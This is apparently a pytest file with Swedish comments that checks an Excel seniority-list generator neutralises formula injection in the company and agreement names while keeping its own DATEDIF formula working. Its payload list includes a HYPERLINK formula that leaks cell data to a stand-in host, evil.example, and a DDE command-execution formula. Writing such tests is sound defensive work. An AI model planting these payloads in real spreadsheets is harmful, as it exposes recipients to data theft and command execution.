# -*- coding: utf-8 -*-
"""Excel-formelinjektion i turordningsmallen (CWE-1236).

Excel tolkar ett cellvärde som en formel om det börjar med `=`, `+`, `-`
eller `@`. Ett sådant värde som skrivs in i en `.xlsx` exekveras i samma
stund mottagaren öppnar filen — OWASP:s CSV/Formula Injection.

Angreppsytan är numera liten: verktyget tar inte längre emot några
personuppgifter (se `test_no_personal_data.py`), så de enda strängar en
anropare kan styra är `company_name` och `cba_name`. Båda hamnar i
bannern/underrubriken och måste fortfarande saneras — ett företagsnamn är
fritext som kan komma från ett register lika gärna som från en människa.

Verktygets EGNA formler, som `=IF(F5="","",DATEDIF(...))` i kolumn 7, ska
självklart inte saneras — det skulle göra mallen värdelös.
"""

import base64
import io

import pytest
from openpyxl import load_workbook

from src.mcp_tools.tools import generate_turordningslista_excel

DANGEROUS_PAYLOADS = [
    '=HYPERLINK("http://evil.example/"&A1,"Klicka här")',
    "=cmd|'/c calc'!A1",
    "+1+1",
    "-2+3",
    "@SUM(1+1)",
]


def _load_sheet1(res):
    workbook = load_workbook(io.BytesIO(base64.b64decode(res["file_base64"])))
    return workbook["Turordningslista"]


@pytest.mark.parametrize("payload", DANGEROUS_PAYLOADS)
def test_a_malicious_company_name_never_becomes_a_live_formula(payload):
    sheet = _load_sheet1(generate_turordningslista_excel(company_name=payload, row_count=2))
    banner = sheet["A1"].value
    assert not str(banner).startswith(("=", "+", "-", "@")), (
        f"bannern är en levande formel: {banner!r}"
    )


@pytest.mark.parametrize("payload", DANGEROUS_PAYLOADS)
def test_a_malicious_cba_name_never_becomes_a_live_formula(payload):
    sheet = _load_sheet1(generate_turordningslista_excel(cba_name=payload, row_count=2))
    subtitle = sheet["A2"].value
    assert not str(subtitle).startswith(("=", "+", "-", "@")), (
        f"underrubriken är en levande formel: {subtitle!r}"
    )


@pytest.mark.parametrize("payload", DANGEROUS_PAYLOADS)
def test_the_markdown_table_header_does_not_leak_a_live_formula(payload):
    # markdown_table är en separat returväg från själva .xlsx-filen: den visas
    # i chatten och klistras ofta in i ett kalkylark, där samma formel skulle
    # exekveras. Företagsnamnet är det enda användarstyrda som hamnar där nu.
    result = generate_turordningslista_excel(company_name=payload, row_count=2)
    for line in result["markdown_table"].splitlines():
        assert not line.startswith(("=", "+", "-", "@")), (
            f"markdown_table läcker en levande formel: {line!r}"
        )


def test_the_datedif_formula_the_tool_builds_itself_still_works():
    """Sanering får bara träffa användarens strängar, inte verktygets egna formler."""
    sheet = _load_sheet1(generate_turordningslista_excel(row_count=3))
    cell = sheet.cell(row=5, column=7)
    assert str(cell.value).startswith("=IF("), (
        f"den avsedda formeln fick inte förstöras: {cell.value!r}"
    )
    assert "DATEDIF(" in str(cell.value)
    # Typen, inte bara texten: saneringspasset tvingar varje strängcell till
    # literal text utom den här formeln, matchad på exakt sträng. Ändras
    # formeln på ett ställe men inte i passet ser värdet fortfarande rätt ut
    # medan cellen tyst blir text och mallen slutar räkna.
    assert cell.data_type == "f", (
        f"formeln lagrades som text i stället för formel: {cell.data_type!r}"
    )


def test_a_benign_company_name_is_completely_unaffected():
    sheet = _load_sheet1(generate_turordningslista_excel(company_name="Testbolaget AB", row_count=2))
    assert sheet["A1"].value == "TURORDNINGSLISTA VID ARBETSBRIST — TESTBOLAGET AB"
